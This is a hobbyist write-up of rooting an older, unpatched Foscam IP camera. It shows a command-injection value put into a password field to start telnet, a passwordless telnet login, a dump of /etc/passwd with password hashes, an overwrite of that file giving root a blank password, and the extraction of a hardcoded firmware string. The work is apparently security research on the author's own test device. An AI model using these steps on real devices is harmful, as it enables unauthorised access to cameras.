# Trying to get shell access

# Poking around

One of the best known vulnerabilities around is/was the hardcoded ftp user 'r' with password 'r'. Logging in and viewing properties reveals the username "ftpuser1". Trying same, and blank, as passwords for that user didn't work for logging into ftp though.

Although the service isn't active, /usr/bin/telnetd apparently does exist! 

Back to the good vulnerabilities, people, Foscam only recently fixed [a command injection vulnerability](https://www.talosintelligence.com/reports/TALOS-2017-0334/). Although all my personal devices were too updated to use it, a buddy donated one of his older non-updated cameras for testing.

## Success! 
Because inputs aren't sanitized, changing a user-account password to "%3B%2Fusr%2Fsbin%2Ftelnetd" (AKA ";/usr/sbin/telnetd") will start the telnet server! (Until you reboot. UPDATE: or not! Apparently ftp users are re-created at each boot, probably due to the squashed filesystem being re-created on boot.)

## Setback! 
The telnet service is indeed active but won't take either my actual admin password, or the r:r combination. !?

## Unbelievably lucky success!
MORE SUCCESS! Apparently the telnet server, absurdly, WILL ALLOW THE ftpuser1 account with no password!!! What?!

But wait! There's more!

Get ready for the absolute height of absurdity:

```
$ id
uid=1001(ftpuser1) gid=1001(ftpuser1) groups=1001(ftpuser1)
$ ls -al /etc/pass*
-rwxrwxrwx    1 1000     ftpgroup       117 Oct 16 00:01 /etc/passwd
-rwxrwxrwx    1 1000     ftpgroup       105 Oct 16 00:01 /etc/passwd-
$ cat /etc/pass*
root:$1$uYfJBoag$N8ofdlVBVcfzOY7utbTfo0:0:0::/root:/bin/sh
ftpuser1:ttirx5dmXIQ6M:1001:1001:ftpgroup:/mnt/sd:/bin/sh
root:$1$uYfJBoag$N8ofdlVBVcfzOY7utbTfo0:0:0::/root:/bin/sh
ftpuser1:x:1001:1001:ftpgroup:/mnt/sd:/bin/sh
```

# Getting root and getting to the point

The no-password ftpuser1 account has write priveleges for passwords?!
Okaaayyyyyyy

(It's worth noting that "ttirx5dmXIQ6M" is on that [that handy dandy list](https://www.seancassidy.me/etc/passwords.txt) of blank password hashes, so everything's checking out so far.)

```
$ echo $'root:ttirx5dmXIQ6M:0:0::/root:/bin/sh\nftpuser1:ttirx5dmXIQ6M:1001:1001:ftpgroup:/mnt/sd:/bin/sh' > /etc/passwd
$ cat /etc/passwd
root:ttirx5dmXIQ6M:0:0::/root:/bin/sh
ftpuser1:ttirx5dmXIQ6M:1001:1001:ftpgroup:/mnt/sd:/bin/sh
```

And telnetting in again with root, and poking around toward out goal.....

```
# id
uid=0(root) gid=0(root) groups=0(root)
# strings /mnt/mtd/app/bin/webService | grep 9bp
9bpwfjxoqbduf39
```

Well, well, well!

This delicious find having been found, it doesn't help for any of my updated cameras where this exploit is patched :(
